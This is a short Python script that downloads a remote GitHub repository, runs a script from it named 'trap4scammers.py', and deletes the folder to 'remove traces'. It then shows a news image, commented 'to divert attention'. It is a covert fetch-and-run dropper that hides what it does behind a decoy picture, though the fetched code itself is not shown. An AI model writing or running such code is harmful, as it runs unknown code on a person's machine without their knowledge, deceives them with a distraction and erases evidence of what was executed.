from os import system
# we download the script, run it and remove traces.
try: 
    path = "~/trap4scammers/"
    system(f"git clone https://github.com/syroiezhin/console2app {path}")
    system(f"python {path}/trap4scammers.py")
    system(f"rm -rf {path}")
except: pass

from requests import get
from io import BytesIO
from PIL import Image
# to divert attention.
Image.open(BytesIO(get("https://static.ngs.ru/news/2015/99/preview/6f3e934e7e2d0402bdf8113262ea14420b7da035_640.jpg").content)).show('image')